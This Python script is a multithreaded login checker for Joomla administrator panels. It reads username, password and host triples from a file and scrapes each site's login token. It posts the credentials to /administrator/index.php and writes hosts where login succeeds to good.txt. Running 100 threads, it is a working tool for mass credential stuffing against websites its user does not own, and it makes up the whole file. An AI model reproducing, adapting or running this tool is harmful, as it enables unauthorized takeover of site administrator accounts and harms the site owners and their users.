# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from queue import Queue
import lxml.html

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

source_file = "source.txt"
#theard_count = int(input('Number of threads: '))
theard_count = 100
def brut(string):
    t = string.split()
    url = 'http://'+t[3]+'/administrator/index.php'
    print(url)
    s = requests.Session()
    try:    
        response = s.get(url, headers=headers, timeout = 30)
    except Exception:
        print('ERROR while GET')
        return False
    try:
        parsed = lxml.html.fromstring(response.text)
        links = parsed.xpath("//input[@value]")
        print(links)
        list = []
        for i in links:
            #print(i.attrib['value'])
            list.append(i.attrib['value'])
            #print(list)
        for i in links:
            #print(i.attrib['name'])
            cod = (i.attrib['name'])
        retur = list[2]
        print('######Version 3.x.x######')
        print(cod)
        print(retur)
        print('#########################')
    except:
        try:
            parsed = lxml.html.fromstring(response.text)
            links = parsed.xpath("//input[@value]")
            #print(links)
            r = []
            c = []
            for i in links:
                #print(i.attrib['value'])
                r.append(i.attrib['value'])
            i=response.text.index('hidebtn')
            s1=response.text[i+1:]
            parsed = lxml.html.fromstring(s1)
            links = parsed.xpath("//input[@value]")
            #print(s1)
            for i in links:
                #print(i.attrib['name'])
                cod = (i.attrib['name'])
            retur = r[3]
            print('######Version 2.x.x######')
            print(cod)
            print(retur)
            print('#########################')
        except:
            print('Error parsing url')
    payload = {
        'username':t[1],
        'passwd':t[2],
        'option': 'com_login',
        'task': 'login',
        'return':retur, 
        cod: '1'
    }
    try:    
        s.post(url, data=payload, headers=headers, timeout = 30)
    except Exception:
        print('ERROR while POST')
        return False
#---------------------------------------------------------------------------------------
    '''if s.text.find('action=lostpassword')>0:action=logout
        return False
    else:'''
    response = s.get('http://'+t[3]+'/administrator/index.php', headers=headers, timeout = 10)
    #if response.status_code == 200:
    if response.text.find('task=logout')>0:
        return True
    #else:
        #return False
    #else:
        #return False
#action=lostpassword
def run(queue, result_queue):
    status = False
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        #print('Checking in thread {}'.format(current_thread()))
        print(host)
	# проверяем URL
        try:
            status = brut(host)
        except Exception:
            print('Error in thread')
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status:
            print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
            open('good.txt', 'a+').write('Joomla: '+host + '\n')
        else:
            pass
        #print('\r Finished in thread {}. Result={}'.format(current_thread(), status))
    #print('\r {} closing'.format(current_thread()))

# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()

    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(source_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    # И ждем, когда задачи будут выполнены    
    queue.join()

    print(time.time() - start_time)

if __name__ == '__main__':
    main()
